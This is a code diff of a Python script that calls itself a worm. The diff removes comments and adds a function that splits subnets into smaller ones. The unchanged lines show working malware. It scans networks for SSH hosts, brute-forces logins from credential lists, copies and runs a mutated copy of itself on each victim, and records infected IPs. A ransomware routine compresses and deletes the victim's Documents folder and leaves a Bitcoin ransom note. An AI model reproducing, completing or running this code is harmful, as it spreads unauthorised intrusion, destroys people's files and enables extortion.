@@ -80,7 +80,6 @@ logger.addHandler(file_handler)
 # Worm Configuration Constants
 #################################
 HOME_DIR = os.path.expanduser("~")
-# For remote file transfer, choose a temporary directory:
 REMOTE_DIR = os.path.join(HOME_DIR, "Temp", "default")
 INFECTED_LOG = os.path.join(HOME_DIR, "infected.log")
 USERNAME_DICT = "username.txt"
@@ -165,7 +164,6 @@ def routes():
             m = re.search(r"^\s*(\d+\.\d+\.\d+\.\d+)\s+(\d+\.\d+\.\d+\.\d+)\s+", line)
             if m:
                 try:
-                    # Combine destination and netmask into a CIDR network.
                     network = IPNetwork(f"{m.group(1)}/{m.group(2)}")
                     discovered.append(network)
                 except AddrFormatError:
@@ -189,9 +187,18 @@ def routes():
                     continue
         return discovered
 
-#################################
-# Cross‑Platform Local Interface Scanner
-#################################
+def partition_subnet(subnet_list):
+    """Split subnets with a mask shorter than MIN_SUBNET_MASK into smaller subnets."""
+    new_subnet_list = []
+    for subnet in subnet_list:
+        if subnet.prefixlen < MIN_SUBNET_MASK:
+            generated_subnets = list(subnet.subnet(MIN_SUBNET_MASK))
+            shuffle(generated_subnets)
+            new_subnet_list.extend(generated_subnets)
+        else:
+            new_subnet_list.append(subnet)
+    return new_subnet_list
+
 def local_addresses():
     """Retrieve local IPv4 addresses and associated CIDR subnets."""
     interfaces = netifaces.interfaces()
@@ -227,11 +234,8 @@ def deploy_ransomware():
         docs_dir = os.path.join(HOME_DIR, "Documents")
         zip_path = os.path.join(HOME_DIR, "Documents.zip")
         try:
-            # Use PowerShell to compress the folder
             subprocess.check_call(["powershell", "-Command",
                                    f"Compress-Archive -Path '{docs_dir}' -DestinationPath '{zip_path}'"])
-            # Optionally, encrypt zip file here using your Python crypto (omitted for brevity)
-            # Remove the original folder:
             subprocess.check_call(["rmdir", "/S", "/Q", docs_dir], shell=True)
             with open(note_path, "w") as f:
                 f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
@@ -254,9 +258,6 @@ def deploy_ransomware():
         except Exception as e:
             logger.error("Error during ransomware operation (Linux): " + str(e))
 
-#################################
-# Host Scanning Functions
-#################################
 def is_host_up(ip, port=22, timeout=0.5):
     """Attempt to open a TCP connection; return True if successful."""
     try:
@@ -326,9 +327,6 @@ def update_infected_log(ip_list):
                 f.write(ip + "\n")
             f.write("\n")
 
-#################################
-# SSH Propagation Functions
-#################################
 def connect_via_ssh(ip):
     """Attempt SSH login to target IP using credential lists."""
     ssh = paramiko.SSHClient()
@@ -382,7 +380,6 @@ def spread(ssh):
                 sftp.mkdir(remote_path)
             except IOError:
                 pass
-            # For directories, you might write a recursive put_dir function.
     sftp.close()
     logger.error("Remote worm deployed. Executing worm via SSH...")
     t = threading.Thread(target=exec_remote_command, args=(ssh, f"(cd {REMOTE_DIR} && python3 {mutated_file})"))
@@ -459,9 +456,7 @@ def initiate_worm():
         logger.info("No new targets found. Terminating propagation.")
         sys.exit(0)
 
-#################################
-# Main Entry Point
-#################################
+
 if __name__ == "__main__":
     try:
         initiate_worm()
